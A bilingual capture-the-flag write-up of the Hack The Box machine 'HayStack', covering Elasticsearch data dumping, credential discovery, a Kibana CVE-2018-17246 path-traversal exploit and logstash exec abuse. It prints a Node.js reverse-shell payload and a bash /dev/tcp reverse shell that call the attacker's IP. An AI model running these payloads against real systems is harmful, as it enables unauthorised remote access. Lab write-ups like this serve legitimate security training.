# HayStack

![eyER9x.png](https://s2.ax1x.com/2019/08/04/eyER9x.png)

## 介绍

目标: 10.10.10.115(Linux)

Kali: 10.10.16.61

HayStack is an easy box in hack the box. But it does isn't easy at all. It's annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.

HayStack 在 HTB 里面的难度评级是简单，但其实它一点都不简单。在一堆西班牙语中找到用户名和密码真的好头痛。 对于 root 权限，你应该对 ELK 有基本的理解。因此，这台机器还是比较新颖的。随带提一句，前段时间出现的 Kibana RCE 漏洞就可以拿来利用。

## 信息枚举

As usual, nmap is utilized to detect detailed ports and services.

老规矩，用 nmap 扫一轮：

```
# Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.27s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9200/tcp open  wap-wsp
```

Then detect the detailed services:

检测到的服务：

```
# Nmap 7.70 scan initiated Sun Jun 30 01:13:05 2019 as: nmap -sC -sV -p22,80,9200 -oN services 10.10.10.115
Nmap scan report for 10.10.10.115
Host is up (0.38s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: 502 Bad Gateway
```

For port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.

对于端口 80，只发现了一张 needle 图片，就真的只是一个针而已，其实这只是靶机作者的寓意而已（大海捞针）。可以使用 Exiftool 来分析图片，但是什么都没有分析出来。使用 gobuster 来爆破路径，但是一个有用的路径都没有发现。

![eDD780.png](https://s2.ax1x.com/2019/08/03/eDD780.png)

For port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.

nmap 好像并不能探测 9200 端口。但是如果你熟悉 elasticsearch 的话，你应该非常熟悉这个端口。 Elasticsearch 是最近特别好的非关系型数据库。这里面似乎有很有趣的东西，我们稍后再具体讨论。

![eDrFKO.png](https://s2.ax1x.com/2019/08/03/eDrFKO.png)

## 漏洞利用

In the above, we have talked about the ports. The elasticsearch should be the point. Try to obtain the data of elasticsearch. There is no authentication for elasticsearch in default. Hence, we can read the data from elasticsearh. In the beginning, I have tried to use kibana to analyze the data. Kibana is one component of ELK, which is a powerful tool to analyze the data of elasticsearch. And it's easy to use. Just download the [files](https://www.elastic.co/cn/downloads/past-releases/kibana-6-4-2), then decompress the files. There is only one step to finish before run kibana. Modify `elasticsearch.url` in `config.yml`, it should be configured to `10.10.10.115:9200`. Then you can run kibana directly.

在上面，我们已经讨论了相关端口。Elasticsearch 应该是问题的关键。先想办法获取 elasticsearch 中的数据。Elasticsearch 默认一般是没有鉴权的。因此，我们可以想办法获取里面的数据。一开始，我尝试使用 kibana 来分析数据。Kibana 是 ELK 技术栈的一部分之一，对于分析 elastcisearch 的数据很方便，而且支持多种查询条件和语法。使用非常简单，只需要下载[文件](https://www.elastic.co/cn/downloads/past-releases/kibana-6-4-2)然后解压。在运行 kibana 之前，只需要修改 `config.yml` 里面的 `elasticsearch.url`，将其配置为 `10.10.10.115:9200` 即可。

When you access to kibana, you will find two indexes: `bank` and `quotes`. The `bank` seems to be data of bank users information, which seems not to be useful. For index `quotes`, we have found nothing but the quote of Spanish. To be honest, Spanish is really messy for me to read. And I cannot find anything interesting. Kibana is useful for query specific field. But `quotes` seems to be an article. So I decide to dump all the data of `quotes`. 

访问 kibana，你可以发现存在两个索引：`bank` 以及 `quotes`。索引 `bank` 好像是银行用户信息的数据，看起来好像没有有用的信息。对于索引 `quotes`，我们发现里面都是西班牙语的句子。说实话，西班牙语看着都头疼，别说在里面找东西了。Kibana 这样去找的话其实还听困难的。而且 `quotes` 索引里面的文章看起来像是一个文章。所以，最好还是一次性把 `quotes` 索引里面所有的数据弄出来。

[elasticsearh-dump](https://github.com/taskrabbit/elasticsearch-dump) is useful to dump the data from elasticsearch. Firstly, install the tool by `npm install elasticdump -g`. Then dump the data by: 

[elasticsearh-dump](https://github.com/taskrabbit/elasticsearch-dump) 可以拿来导出 elasticsearch 中的数据。可以通过 `npm install elasticdump -g ` 安装工具，接着导出数据：

```
elasticdump \
  --input=http://production.es.com:9200/quotes \
  --output=quptes.json \
  --type=data
```

The result will be json file of a list of objects consist of some keys. The most important is the quote in the result. But the json is still not convenient to read. And the id may be the sequence of quotes. So, I decide to write a script to order the quotes by id and join all the quotes together.

结果是由包含多个键值对的对象数组的 JSON 数据。这里面最重要的就是里面的 quote 属性。直接阅读 JSON 也不是很方面，而且里面 id 的顺序可能很重要。所以，我写了一个脚本可以将里面的 quote 安装 id 排序，并将他们拼接在一起。

```python
import json
result = {}
txt = ""
with open("quotes.json") as f:
  data = f.readlines()
  for ele in data:
    obj = json.loads(ele)
    id = int(obj["_id"])
    result[id] = obj["_source"]["quote"]
  for i in sorted(result.keys()):
    print(i)
    txt = txt + result[i] + "\n\n"
with open("result.md", "w") as f1:
  f1.write(txt)
```

Now, I have the result of quotes. And it's easy to read. I place this file in Github. When I read this file by Chrome, Chrome can help me translate this article. So, it's easier to find special things in the article. I have found two interesting strings in the article.

现在，我们就有了最终结果。阅读起来方便多了，我将这个[文件](https://github.com/neal1991/htb/blob/master/Haystack/result.md)放在了 Github。如果你使用 Chrome 打开这个文件，你可直接右键选择翻译，这样我们要找的东西就明显多了。在这篇文章可以找到两个有趣的字符串。

![result.md](https://s2.ax1x.com/2019/11/03/KOU5KU.gif)

```
Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg
```

```
Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=
```

If you translate the two stings into English respectively.

如果将这两句话翻译一下：

```
我已经保存了这台机器的密码： dXNlcjogc2VjdXJpdHkg
```

```
密钥不能丢，我保存在了这里: cGFzczogc3BhbmlzaC5pcy5rZXk=
```

The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. 

后面的字符串使用 base64 进行编码，解码之后，我们就可以看到对应的用户名和密码。通过这个用户名和密码就可以 ssh 登录机器了。

![erZrTA.png](https://s2.ax1x.com/2019/08/03/erZrTA.png)

To be honest, I don't like the user of the box. But it does works as the keyword: you have to find a needle in haystack.

说实话，其实我不是很喜欢这台机器的普通用户的部分。不过也正如这台机器关键的一句话：你需要海底捞针。

## 提权

If you look around the box, you will find the box is installed with ELK. You can find kibana and logstash in the box. If you google `kibana exploit`. You will find [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246) in Github. It has detailed illustrates the ways to exploit.

如果你仔细看一下这台机器，你就会发现这台机器就是使用了 ELK。你可以在机器里面找到 kibana 以及 logstash。如果你谷歌 `kibana exploit`，你可以找到 Github 里面的 [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246)，里面有详细的利用过程。不过其实通过 kibana 最新的漏洞 [CVE-2019-7609](https://madneal.com/post/kibana%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/) 也是可以的。

However, there is a problem that the kibana service is only running in local. So you cannot access kibana service externally. There is a way to utilize ssh to redirect the network stream.

然而，有个问题是 kibana 的服务只是在本地运行，因为它配置项里面没有配置对外开放。所以你不能直接从外部访问 kibana 服务。可以通过 ssh 重定向网络流量。

```
ssh 5601:localhost:5601 security@10.10.10.115
```

Then, we can access to the kibana service in 10.10.10.115 by access to `localhost:5601`. Place the `server.js` in tmp directory of the target machine.

这样我们就可以通过 `localhost:5601` 访问 10.10.10.115 机器里面的 kibana 服务了。将漏洞利用代码的 `server.js` 文件放在目标机器里面的 tmp 目录。

```
// server.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "10.10.16.61", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Then we can implement by burp, remember to set up nc listener `nc -lvnp 1234`

我们可以通过 burp 来实现，记得先设置 nc 监听：`nc -lvnp 1234`：

```
GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/server.jssudo -l HTTP/1.1
Host: localhost:5601
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5601/app/kibana
content-type: application/json
kbn-version: 6.4.2
origin: http://localhost:5601
Connection: close
```

Wait for a while, then we are kibana.

稍等一会，现在我们就是 kibana 用户了。

[![erlWZT.png](https://s2.ax1x.com/2019/08/03/erlWZT.png)](https://imgchr.com/i/erlWZT)

But we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the user group `kibana` has write permission of `conf.d` of logstash.

但是我们还不是 root 用户！不要沮丧，继续弄。如果我们仔细研究一下这台机器里面的 logstash，我们会发现一件有趣的事。我们发现用户组 `kibana` 拥有 logstash `conf.d` 文件夹的写权限。

```
ls -lah
total 52K
drwxr-xr-x.  3 root   root    183 jun 18 22:15 .
drwxr-xr-x. 83 root   root   8,0K jun 24 05:44 ..
drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
-rw-r--r--.  1 root   kibana 1,9K nov 28  2018 jvm.options
-rw-r--r--.  1 root   kibana 4,4K sep 26  2018 log4j2.properties
-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf
-rw-r--r--.  1 root   kibana 8,0K ene 23  2019 logstash.yml
-rw-r--r--.  1 root   kibana 8,0K sep 26  2018 logstash.yml.rpmnew
-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml
-rw-------.  1 kibana kibana 1,7K dic 10  2018 startup.option
```

`conf.d` is the config directory of logstash consists of three files in general. Take a deep look into the directory, you'll find an interesting thing. There is a command executes in `output.conf`. If you have basic knowledge of logstash, you should know the function of the three files. `input.conf` is used to config the data source. `filter.conf` is used to process the data, which is usually combined with grok. `output.conf` is used to output the processed data. We can find there is an `exec` in the `output.conf`.

`conf.d` 是 logstash 的配置文件夹，一般由3个文件组成。查看一下这个目录，你就会发现有趣的事。在 `output.cong` 里面存在一个命令执行。如果你对 logstash 有基本的人事，你应该知道这3个文件的作用分别是啥。 `input.conf` 是用来配置数据源。 `filter.conf` 是用来处理数据，支持多种插件，非常强大。`output.conf` 是用来输出处理后的数据，比如输出到 elasticsearch 或者文件中。我们可以找到 `output.conf` 里面的 `exec`。

So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.

因此利用过程就非常清晰了。在 `/opt/kibana/` 文件夹里面创建一个前缀为 `logstash_` 的文件。注意确保文件里面的内容可以被 grok 正确的解析，grok 是 logstash 一个通过正则解析数据的插件。然后这个命令就可以成功执行了。这里面最重要的部分就是如何创建可以被正确解析的 `comando` 内容了。如果你知道如何使用 grok 就非常轻松了。[Grok Debugger](https://grokdebug.herokuapp.com/) 是一个还好用的在线调试 grok 表达式的工具。

![eyPIxg.png](https://s2.ax1x.com/2019/08/04/eyPIxg.png)

The expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.

表达式非常简单。如果你熟悉正则的话，这个表达式很好理解。

**filter.conf**

```
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
```

**input.conf**

```
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
```

**output.conf**

```
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```

Now, we have known how to create the corresponding `comando`. The next step is to choose the command to execute. There is not nc in the machine. But there's python and perl in the machine. But the reverse shell command is a little long. So I choose to use `bash -i >& /dev/tcp/10.10.16.61/1234 0>&1`. Write the content to the corresponding file:

现在，我们已经知道如何创建相应的 `comando` 里面。下一步就是选择执行命令了。这台机器里面没有 nc。但是机器里面有 python 和 perl。所以反弹 shell 的命令会有一点场。最后选择了反弹命令：`bash -i >& /dev/tcp/10.10.16.61/1234 0>&1`。将相应的内容写入到文件中：

```
echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1" > /opt/kibana/logstash_1.txt
```

Use the nc to listen at port 1234, wait a while, root is coming.

将 nc 设置监听端口 1234，稍等一会，我们就是 root 用户了。

![eykUVs.png](https://s2.ax1x.com/2019/08/04/eykUVs.png)
